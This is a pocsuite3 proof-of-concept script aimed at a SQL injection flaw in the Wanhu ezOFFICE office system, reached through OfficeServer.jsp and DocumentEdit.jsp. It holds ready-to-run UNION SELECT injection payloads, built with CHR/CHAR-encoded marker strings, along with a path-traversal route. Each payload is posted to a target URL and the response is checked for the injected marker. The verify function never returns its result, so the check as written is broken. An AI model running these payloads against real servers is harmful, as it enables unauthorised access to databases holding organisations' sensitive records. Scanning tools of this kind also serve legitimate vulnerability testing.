from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '万户 ezOFFICE OfficeServer.jsp 存在SQL注入漏洞'
    appName = '万户 ezOFFICE'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''北京万户网络技术有限公司ezOFFICE OfficeServer.jsp 存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        paths = ["/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1'+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHR(113)||CHR(107)||CHR(113)||CHR(112)||CHR(113)||CHR(68)||CHR(72)||CHR(116)||CHR(113)||CHR(107)||CHR(113)||CHR(112)||CHR(113)+FROM+DUAL--+ONYT&XYBH=1&BMJH=1&JF=1&YF=1&HZNR=1&QLZR=1&CPMC=1&DGSL=1&DGRQ=1",
                "/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=11'+UNION+ALL+SELECT+NULL,NULL,CHAR(113)%2bCHAR(107)%2bCHAR(113)%2bCHAR(112)%2bCHAR(113)%2bCHAR(68)%2bCHAR(72)%2bCHAR(116)%2bCHAR(113)%2bCHAR(107)%2bCHAR(113)%2bCHAR(112)%2bCHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)%2bCHAR(107)%2bCHAR(113)%2bCHAR(112)%2bCHAR(113)%2bCHAR(68)%2bCHAR(72)%2bCHAR(116)%2bCHAR(113)%2bCHAR(107)%2bCHAR(113)%2bCHAR(112)%2bCHAR(113),NULL--+QAJc&XYBH=1&BMJH=1&JF=1&YF=1&HZNR=1&QLZR=1&CPMC=1&DGSL=1&DGRQ=1&XYBH=1&BMJH=1&JF=1&YF=1&HZNR=1&QLZR=1&CPMC=1&DGSL=1&DGRQ=1"]
        for path in paths:
            vul_url = self.url+path
            resp = requests.post(url=vul_url, headers=headers, verify=False, allow_redirects=False, timeout=10)
            if resp.status_code == 200 and 'qkqpqDHtqkqpq' in resp.text:  
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vul_url

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
